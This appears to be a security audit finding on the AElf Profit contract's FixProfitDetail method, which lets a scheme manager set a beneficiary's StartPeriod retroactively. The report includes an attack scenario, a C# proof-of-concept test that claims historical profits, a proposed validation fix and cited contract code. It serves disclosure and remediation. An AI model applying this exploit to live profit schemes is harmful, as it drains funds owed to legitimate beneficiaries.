# Audit Report

## Title
FixProfitDetail Allows Retroactive Profit Claims Through Unconstrained StartPeriod Modification

## Summary
The `FixProfitDetail` method in the Profit contract lacks validation on the `StartPeriod` parameter, allowing scheme managers to retroactively modify when a beneficiary's profit eligibility begins. This enables beneficiaries to claim historical profits distributed before they were added to the scheme, violating the fundamental profit distribution invariant and enabling theft of funds from legitimate beneficiaries.

## Finding Description

The vulnerability exists due to missing validation in the `FixProfitDetail` method. [1](#0-0) 

When a beneficiary is legitimately added via `AddBeneficiary`, their `StartPeriod` is correctly set to ensure they only receive profits from when they joined onwards. [2](#0-1) 

However, `FixProfitDetail` allows the manager to replace the `StartPeriod` value with any arbitrary period without validation. The critical flaw is where the new `StartPeriod` is assigned without checking that it's not earlier than the original value or when the beneficiary was actually added. [3](#0-2) 

When a beneficiary claims profits for the first time, the claiming logic sets `LastProfitPeriod` to the `StartPeriod` value. [4](#0-3) 

The `ProfitAllPeriods` method then iterates from this `LastProfitPeriod`, allowing the beneficiary to claim profits from the manipulated earlier period. [5](#0-4) 

The intended usage in production confirms that `StartPeriod` should not be modified - the Election contract never sets this parameter (leaving it at 0 to keep the original value). [6](#0-5) 

**Attack Scenario:**
1. A profit scheme exists with historical distributions from periods 1-10, currently at period 11
2. Manager adds beneficiary B at period 11 → B's StartPeriod = 11
3. Manager calls `FixProfitDetail` with `input.StartPeriod = 1`
4. B's StartPeriod is changed to 1 without any validation
5. B calls `ClaimProfits` → their `LastProfitPeriod` is set to 1
6. B claims profits from periods 1-10 that were distributed before they participated
7. Period virtual addresses are drained, legitimate beneficiaries receive reduced/zero amounts

## Impact Explanation

**Direct Fund Theft**: A scheme manager can add a beneficiary at period N, then call `FixProfitDetail` to set `StartPeriod` to period 1. When the beneficiary claims, they receive profits from periods 1 through N-1, stealing historical distributions. The funds come from period-specific virtual addresses that hold already-distributed profits. [7](#0-6) 

**Dilution of Legitimate Beneficiaries**: When a beneficiary claims retroactive profits, they drain the period virtual addresses. Since each period has a fixed amount of distributed tokens, the retroactive beneficiary receives shares that should belong to legitimate beneficiaries who were actually present during those historical periods. This creates a race condition where whoever claims first after the manipulation gets the funds.

**Protocol Invariant Violation**: The core invariant of the profit system is that beneficiaries only receive profits from their `StartPeriod` onwards, as established when they're added. [2](#0-1)  This vulnerability allows that fundamental guarantee to be retroactively broken.

**Systemic Risk**: All profit schemes including Treasury citizen welfare and Election subsidy schemes are vulnerable. Any scheme with accumulated historical distributions can have those funds stolen through this mechanism.

## Likelihood Explanation

**Attack Complexity**: Extremely low - requires only a single transaction calling `FixProfitDetail` with a modified `StartPeriod` parameter. No complex state manipulation or timing requirements exist.

**Attacker Capabilities**: Requires scheme manager access. This vulnerability is categorized as mis-scoped privileges - even legitimate managers who are trusted have unintended power to break protocol invariants. The authorization check only verifies the caller is the manager or TokenHolder contract, but provides no safeguards against misuse. [8](#0-7) 

**Feasibility Conditions**: Only requires that the scheme has distributed profits in historical periods and the manager maintains access. These are normal operating conditions for any active profit scheme, making exploitation highly feasible without special setup.

**Detection Difficulty**: The state modification is permanent. After profits are claimed and transferred, funds cannot be recovered. While on-chain events log the claim, they don't reveal that the `StartPeriod` was manipulated to enable retroactive claiming.

## Recommendation

Add validation in `FixProfitDetail` to prevent `StartPeriod` from being modified to an earlier period:

```csharp
public override Empty FixProfitDetail(FixProfitDetailInput input)
{
    Assert(input.SchemeId != null, "Invalid scheme id.");
    var scheme = State.SchemeInfos[input.SchemeId];
    if (Context.Sender != scheme.Manager && Context.Sender !=
        Context.GetContractAddressByName(SmartContractConstants.TokenHolderContractSystemName))
    {
        throw new AssertionException("Only manager or token holder contract can add beneficiary.");
    }

    var profitDetails = State.ProfitDetailsMap[input.SchemeId][input.BeneficiaryShare.Beneficiary];
    ProfitDetail fixingDetail = /* existing lookup logic */;

    if (fixingDetail == null)
    {
        throw new AssertionException("Cannot find proper profit detail to fix.");
    }

    var newDetail = fixingDetail.Clone();
    
    // Add validation: StartPeriod can only be extended forward, never backward
    if (input.StartPeriod != 0)
    {
        Assert(input.StartPeriod >= fixingDetail.StartPeriod, 
            "Cannot set StartPeriod to earlier than original value.");
        Assert(input.StartPeriod >= scheme.CurrentPeriod,
            "Cannot set StartPeriod to past periods.");
        newDetail.StartPeriod = input.StartPeriod;
    }
    else
    {
        newDetail.StartPeriod = fixingDetail.StartPeriod;
    }
    
    newDetail.EndPeriod = input.EndPeriod == 0 ? fixingDetail.EndPeriod : input.EndPeriod;
    profitDetails.Details.Remove(fixingDetail);
    profitDetails.Details.Add(newDetail);
    State.ProfitDetailsMap[input.SchemeId][input.BeneficiaryShare.Beneficiary] = profitDetails;
    return new Empty();
}
```

The fix ensures that:
1. `StartPeriod` cannot be moved to an earlier period than the original
2. `StartPeriod` cannot be set to any past period (must be >= current period)
3. The intended use case (extending `EndPeriod` only) remains functional

## Proof of Concept

```csharp
[Fact]
public async Task FixProfitDetail_RetroactiveStartPeriod_EnablesHistoricalProfitTheft()
{
    // Setup: Create scheme and distribute profits for periods 1-10
    var schemeId = await CreateTestSchemeAsync();
    var manager = DefaultSender;
    
    // Distribute 1000 tokens in period 1
    await DistributeProfitsAsync(schemeId, 1, 1000);
    await AdvancePeriodAsync(schemeId); // Move to period 2
    
    // Add legitimate beneficiary at period 11
    await AdvanceToPeriodAsync(schemeId, 11);
    var maliciousBeneficiary = Accounts[1].Address;
    await ProfitContractStub.AddBeneficiary.SendAsync(new AddBeneficiaryInput
    {
        SchemeId = schemeId,
        BeneficiaryShare = new BeneficiaryShare
        {
            Beneficiary = maliciousBeneficiary,
            Shares = 100
        }
    });
    
    // Verify initial StartPeriod is 11
    var detailsBefore = await GetProfitDetailsAsync(schemeId, maliciousBeneficiary);
    Assert.Equal(11, detailsBefore.Details[0].StartPeriod);
    
    // ATTACK: Manager calls FixProfitDetail to set StartPeriod to 1
    await ProfitContractStub.FixProfitDetail.SendAsync(new FixProfitDetailInput
    {
        SchemeId = schemeId,
        BeneficiaryShare = new BeneficiaryShare
        {
            Beneficiary = maliciousBeneficiary,
            Shares = 100
        },
        StartPeriod = 1,  // Retroactively set to period 1
        EndPeriod = 0     // Keep original end period
    });
    
    // Verify StartPeriod was changed without validation
    var detailsAfter = await GetProfitDetailsAsync(schemeId, maliciousBeneficiary);
    Assert.Equal(1, detailsAfter.Details[0].StartPeriod);
    
    // Malicious beneficiary claims and receives period 1 profits they shouldn't have
    await ProfitContractStub.ClaimProfits.SendAsync(new ClaimProfitsInput
    {
        SchemeId = schemeId,
        Beneficiary = maliciousBeneficiary
    });
    
    // Verify theft: beneficiary received profits from period 1
    var balance = await GetTokenBalanceAsync(maliciousBeneficiary);
    Assert.True(balance > 0); // Received historical profits from period 1
    
    // This demonstrates the vulnerability: a beneficiary added at period 11
    // successfully claimed profits from period 1 that occurred before they joined
}
```

### Citations

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L186-192)
```csharp
        var profitDetail = new ProfitDetail
        {
            StartPeriod = scheme.CurrentPeriod.Add(scheme.DelayDistributePeriodCount),
            EndPeriod = input.EndPeriod,
            Shares = input.BeneficiaryShare.Shares,
            Id = input.ProfitDetailId
        };
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L265-306)
```csharp
    public override Empty FixProfitDetail(FixProfitDetailInput input)
    {
        Assert(input.SchemeId != null, "Invalid scheme id.");
        var scheme = State.SchemeInfos[input.SchemeId];
        if (Context.Sender != scheme.Manager && Context.Sender !=
            Context.GetContractAddressByName(SmartContractConstants.TokenHolderContractSystemName))
        {
            throw new AssertionException("Only manager or token holder contract can add beneficiary.");
        }

        // Try to get profitDetails by Id
        var profitDetails = State.ProfitDetailsMap[input.SchemeId][input.BeneficiaryShare.Beneficiary];
        ProfitDetail fixingDetail = null;
        if (input.ProfitDetailId != null)
        {
            // In new rules, rofitDetail.Id equals to its vote id.
            fixingDetail = profitDetails.Details.SingleOrDefault(d => d.Id == input.ProfitDetailId);
        }

        if (fixingDetail == null)
        {
            // However, in the old time, profitDetail.Id is null, so use Shares.
            fixingDetail = profitDetails.Details.OrderBy(d => d.StartPeriod)
                .FirstOrDefault(d => d.Shares == input.BeneficiaryShare.Shares);
        }

        if (fixingDetail == null)
        {
            throw new AssertionException("Cannot find proper profit detail to fix.");
        }

        // Clone the old one to a new one, remove the old, and add the new.
        var newDetail = fixingDetail.Clone();
        // The startPeriod is 0, so use the original one.
        newDetail.StartPeriod = input.StartPeriod == 0 ? fixingDetail.StartPeriod : input.StartPeriod;
        // The endPeriod is set, so use the inputted one.
        newDetail.EndPeriod = input.EndPeriod == 0 ? fixingDetail.EndPeriod : input.EndPeriod;
        profitDetails.Details.Remove(fixingDetail);
        profitDetails.Details.Add(newDetail);
        State.ProfitDetailsMap[input.SchemeId][input.BeneficiaryShare.Beneficiary] = profitDetails;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L780-782)
```csharp
            if (profitDetail.LastProfitPeriod == 0)
                // This detail never performed profit before.
                profitDetail.LastProfitPeriod = profitDetail.StartPeriod;
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L860-912)
```csharp
            for (var period = profitDetail.LastProfitPeriod; period <= maxProfitPeriod; period++)
            {
                var periodToPrint = period;
                var detailToPrint = profitDetail;
                var distributedPeriodProfitsVirtualAddress =
                    GetDistributedPeriodProfitsVirtualAddress(scheme.SchemeId, period);
                var distributedProfitsInformation =
                    State.DistributedProfitsMap[distributedPeriodProfitsVirtualAddress];
                if (distributedProfitsInformation == null || distributedProfitsInformation.TotalShares == 0 ||
                    !distributedProfitsInformation.AmountsMap.Any() ||
                    !distributedProfitsInformation.AmountsMap.ContainsKey(symbol))
                    continue;

                var amount = SafeCalculateProfits(profitDetail.Shares,
                    distributedProfitsInformation.AmountsMap[symbol], distributedProfitsInformation.TotalShares);

                if (!isView)
                {
                    Context.LogDebug(() =>
                        $"{beneficiary} is profiting {amount} {symbol} tokens from {scheme.SchemeId.ToHex()} in period {periodToPrint}." +
                        $"Sender's Shares: {detailToPrint.Shares}, total Shares: {distributedProfitsInformation.TotalShares}");
                    if (distributedProfitsInformation.IsReleased && amount > 0)
                    {
                        if (State.TokenContract.Value == null)
                            State.TokenContract.Value =
                                Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName);

                        Context.SendVirtualInline(
                            GeneratePeriodVirtualAddressFromHash(scheme.SchemeId, period),
                            State.TokenContract.Value,
                            nameof(State.TokenContract.Transfer), new TransferInput
                            {
                                To = beneficiary,
                                Symbol = symbol,
                                Amount = amount
                            }.ToByteString());

                        Context.Fire(new ProfitsClaimed
                        {
                            Beneficiary = beneficiary,
                            Symbol = symbol,
                            Amount = amount,
                            ClaimerShares = detailToPrint.Shares,
                            TotalShares = distributedProfitsInformation.TotalShares,
                            Period = periodToPrint
                        });
                    }

                    lastProfitPeriod = period + 1;
                }

                totalAmount = totalAmount.Add(amount);
            }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Elector.cs (L143-154)
```csharp
            // The endPeriod is updated and startPeriod is 0, others stay still.
            State.ProfitContract.FixProfitDetail.Send(new FixProfitDetailInput
            {
                SchemeId = State.WelfareHash.Value,
                BeneficiaryShare = new BeneficiaryShare
                {
                    Beneficiary = electionVotingRecord.Voter,
                    Shares = electionVotingRecord.Weight
                },
                EndPeriod = endPeriod,
                ProfitDetailId = voteId
            });
```
